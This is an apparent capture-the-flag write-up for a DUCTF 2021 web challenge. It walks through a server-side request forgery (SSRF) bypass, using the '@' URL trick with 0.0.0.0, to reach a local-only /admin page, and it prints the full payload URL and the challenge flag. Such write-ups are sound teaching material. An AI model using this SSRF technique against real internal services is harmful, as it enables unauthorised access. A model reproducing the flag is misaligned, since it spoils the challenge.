## Inside Out Write Up


On the main screen, I found /admin, which is annotated in the source code.
<img width="1792" alt="Screen Shot 2021-09-27 at 8 44 51 AM" src="https://user-images.githubusercontent.com/84657474/134828375-f74cf365-141e-4fea-bdbe-c1bb76b1cdb8.png">

When accessing with /admin, the phrase "accessible only locally" appears.
<img width="1792" alt="Screen Shot 2021-09-27 at 8 46 08 AM" src="https://user-images.githubusercontent.com/84657474/134828411-6e9bf132-f5d8-4377-b03a-ffababc950d9.png">

This part reminded me of SSRF

[What is SSRF ?](https://portswigger.net/web-security/ssrf)

SSRF uses **@** to create vulnerabilities.   

We checked the Request part at the URL and decided that we could create an SSRF vulnerability through this part.
<img width="1792" alt="Screen Shot 2021-09-27 at 8 52 34 AM" src="https://user-images.githubusercontent.com/84657474/134828589-38a1f63e-ebc6-4a1f-adac-8fa67bd2744b.png">


<hr>

## exploit

```
@/0.0.0.0/admin
```

<img width="1792" alt="Screen Shot 2021-09-27 at 8 58 36 AM" src="https://user-images.githubusercontent.com/84657474/134828759-7967ef73-3740-4f59-9c3d-629603362a19.png">

```
https://web-inside-out-b3d9f3b9.chal-2021.duc.tf/request?url=http://example.com@0.0.0.0/admin
```

<hr>

# Flag
```
DUCTF{very_spooky_request}
```
